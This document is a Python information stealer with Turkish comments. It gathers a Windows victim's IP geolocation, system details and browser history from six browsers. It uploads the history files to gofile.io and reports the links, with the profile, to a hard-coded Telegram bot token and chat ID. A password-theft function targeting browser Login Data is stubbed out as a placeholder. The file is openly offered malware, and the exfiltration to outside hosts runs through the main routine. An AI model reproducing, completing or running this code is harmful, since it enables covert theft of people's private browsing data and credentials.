import os
import sqlite3
import shutil
import psutil
import platform
import requests
import subprocess
from datetime import datetime, timedelta
from json import loads
from tempfile import gettempdir

# Telegram Bot Token'ınızı ve Chat ID'nizi buraya ekleyin
TOKEN = '7302274941:AAEtXLRLgI5LYuzM351JFX04roSK0xrMx5Y'
CHAT_ID = '5048211088'

# IP adresini öğrenmek için API
ip_api_url = 'https://api.ipify.org?format=json'

# IP adresi ile genel bilgi almak için API
apiKey = '4019aec8e933d243'
ipapi_base_url = 'https://api.ipapi.is'

# Tarayıcı geçmişi ve şifre dosyaları
history_files = {
    'Google': os.path.join(gettempdir(), 'google_browser_history.txt'),
    'Edge': os.path.join(gettempdir(), 'edge_browser_history.txt'),
    'Firefox': os.path.join(gettempdir(), 'firefox_browser_history.txt'),
    'Opera': os.path.join(gettempdir(), 'opera_browser_history.txt'),
    'Opera GX': os.path.join(gettempdir(), 'opera_gx_browser_history.txt'),
    'Brave': os.path.join(gettempdir(), 'brave_browser_history.txt')
}

password_files = {
    'Google': os.path.join(gettempdir(), 'google_passwords.txt'),
    'Edge': os.path.join(gettempdir(), 'edge_passwords.txt'),
    'Firefox': os.path.join(gettempdir(), 'firefox_passwords.txt'),
    'Opera': os.path.join(gettempdir(), 'opera_passwords.txt'),
    'Opera GX': os.path.join(gettempdir(), 'opera_gx_passwords.txt'),
    'Brave': os.path.join(gettempdir(), 'brave_passwords.txt')
}

def get_external_ip():
    """Kullanıcının dış IP adresini alır."""
    response = requests.get(ip_api_url)
    if response.status_code == 200:
        return response.json().get('ip')
    else:
        return 'Bilgi alınamadı'

def get_ip_info(ip):
    """IP adresi bilgilerini alır."""
    ipapi_url = f'{ipapi_base_url}?q={ip}&key={apiKey}'
    response = requests.get(ipapi_url)
    if response.status_code == 200:
        data = response.json()
        ip_info = (
            f"**IP Adresi Bilgileri**\n"
            f"- 🌐 **IP Adresi**: {data.get('ip', 'Bilgi bulunamadı')}\n"
            f"- 🌍 **Şehir**: {data.get('location', {}).get('city', 'Bilgi bulunamadı')}\n"
            f"- 🏙️ **Bölge**: {data.get('location', {}).get('state', 'Bilgi bulunamadı')}\n"
            f"- 🇹🇷 **Ülke**: {data.get('location', {}).get('country', 'Bilgi bulunamadı')}\n"
            f"- 📍 **Coğrafi Koordinatlar**: {data.get('location', {}).get('latitude', 'Bilgi bulunamadı')}, {data.get('location', {}).get('longitude', 'Bilgi bulunamadı')}\n"
            f"- 🕒 **Yerel Saat**: {data.get('location', {}).get('local_time', 'Bilgi bulunamadı')}\n"
            f"- 🏢 **ISP**: {data.get('company', {}).get('name', 'Bilgi bulunamadı')}\n"
            f"- 🌐 **ASN**: {data.get('asn', {}).get('asn', 'Bilgi bulunamadı')}\n"
        )
        return ip_info
    else:
        return 'IP bilgileri alınamadı'

def get_system_info():
    """Cihaz bilgilerini toplar."""
    uname = platform.uname()
    cpu_info = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    
    info = (
        f"**Cihaz Bilgileri**\n"
        f"- 🖥️ **Sistem**: {uname.system}\n"
        f"- 👤 **Kullanıcı Adı**: {uname.node}\n"
        f"- 📦 **Yazılım**: {uname.version}\n"
        f"- 🧠 **CPU**: {psutil.cpu_count()} çekirdek\n"
        f"- ⚡ **CPU Kullanımı**: {cpu_info}%\n"
        f"- 💾 **Toplam Bellek**: {memory_info.total / (1024 ** 3):.2f} GB\n"
        f"- 🧩 **Kullanılan Bellek**: {memory_info.used / (1024 ** 3):.2f} GB\n"
        f"- 📉 **Boş Bellek**: {memory_info.available / (1024 ** 3):.2f} GB\n"
        f"- 📅 **Tarih ve Saat**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    
    return info

def extract_browser_history(browser):
    """Tarayıcı geçmişini çeker ve bir dosyaya yazar."""
    db_paths = {
        'Google': os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
        'Edge': os.path.expanduser('~') + r'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
        'Firefox': os.path.expanduser('~') + r'\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile>\\places.sqlite',
        'Opera': os.path.expanduser('~') + r'\\AppData\\Roaming\\Opera Software\\Opera Stable\\History',
        'Opera GX': os.path.expanduser('~') + r'\\AppData\\Local\\Opera Software\\Opera GX Stable\\History',
        'Brave': os.path.expanduser('~') + r'\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History'
    }

    history_db_path = db_paths.get(browser)
    if not history_db_path or not os.path.exists(history_db_path):
        return f"{browser}: Tarayıcı bulunamadı veya geçmiş verisi mevcut değil."
    
    shutil.copy(history_db_path, f'{browser}_History_copy')  # Kopyayı oluştur
    conn = sqlite3.connect(f'{browser}_History_copy')
    cursor = conn.cursor()
    
    try:
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        rows = cursor.fetchall()
        
        with open(history_files[browser], 'w', encoding='utf-8') as file:
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=(row[2] / 10))
                file.write(f"URL: {url}\nBaşlık: {title}\nSon Ziyaret Zamanı: {last_visit_time}\n\n")
        
        conn.close()
        os.remove(f'{browser}_History_copy')  # Kopyayı sil
        
        return f"{browser}: {history_files[browser]}"
    except Exception as e:
        conn.close()
        os.remove(f'{browser}_History_copy')  # Kopyayı sil
        return f"{browser}: Tarayıcı geçmişi okunamadı. Hata: {e}"

def extract_browser_passwords(browser):
    """Tarayıcı şifrelerini çeker ve bir dosyaya yazar."""
    # Bu kısım, daha önce verdiğiniz `extract_and_process_passwords` işlevinin uyarlanmış hali olmalıdır.
    # Aşağıda sadece yer tutucu olarak gösterilmiştir. Şifre çıkartma işlemi için gerekli işlevler eklenmelidir.
    try:
        # İşlem yapılacak tarayıcıya ait şifre dosyasının yolu
        login_data_path = os.path.expanduser(f'~\\AppData\\Local\\{browser}\\User Data\\Default\\Login Data')
        
        # Gerekli işlevlerin tanımlanması ve şifrelerin çözülmesi işlemleri
        # Örneğin, SQ17H1N6 ve D3CrYP7V41U3 işlevleri burada kullanılabilir.
        
        # Sonuçları `password_files` sözlüğüne yazma
        with open(password_files[browser], 'w', encoding='utf-8') as file:
            file.write("Şifreler burada olacak...")  # Şifrelerin yazıldığı yer
        
        return f"{browser}: {password_files[browser]}"
    except Exception as e:
        return f"{browser}: Şifreler okunamadı. Hata: {e}"

def upload_file_to_gofile(path):
    """Dosyayı gofile.io'ya yükler ve linki döndürür."""
    try:
        with open(path, 'rb') as file:
            response = requests.post(
                'https://store1.gofile.io/contents/uploadfile',
                files={'file': file}
            )
        
        response_data = response.json()
        if response_data.get('status') == 'ok':
            return response_data["data"]["downloadPage"]
        else:
            return 'Dosya yüklenemedi'
    except Exception as e:
        return 'Dosya yüklenemedi'

def send_message_to_telegram(message):
    """Mesajı Telegram kanalına gönderir."""
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'  # Markdown formatında gönderir
    }
    
    response = requests.post(url, data=payload)
    
    if response.status_code == 200:
        print('Mesaj başarıyla gönderildi!')
    else:
        print(f'Bir hata oluştu. Status kodu: {response.status_code}')
        print(response.text)

if __name__ == "__main__":
    external_ip = get_external_ip()
    ip_info = get_ip_info(external_ip)
    system_info = get_system_info()
    
    history_links = []
    password_links = []
    for browser in ['Google', 'Edge', 'Firefox', 'Opera', 'Opera GX', 'Brave']:
        # Tarayıcı geçmişini çıkar
        result = extract_browser_history(browser)
        if 'Tarayıcı bulunamadı' not in result and 'Dosya yüklenemedi' not in result:
            upload_link = upload_file_to_gofile(history_files[browser])
            history_links.append(f"{browser} geçmişi: {upload_link}")
        else:
            history_links.append(result)
        
        # Tarayıcı şifrelerini çıkar
        result = extract_browser_passwords(browser)
        if 'Şifreler okunamadı' not in result and 'Dosya yüklenemedi' not in result:
            upload_link = upload_file_to_gofile(password_files[browser])
            password_links.append(f"{browser} şifreleri: {upload_link}")
        else:
            password_links.append(result)
    
    message = (
        f"{system_info}\n\n"
        f"{ip_info}\n\n"
        f"**Tarayıcı Geçmiş Dökümanları;**\n"
        f"{'\n'.join(history_links)}\n\n"
        f"**Tarayıcı Şifreleri Dökümanları;**\n"
        f"{'\n'.join(password_links)}\n"
    )
    
    send_message_to_telegram(message)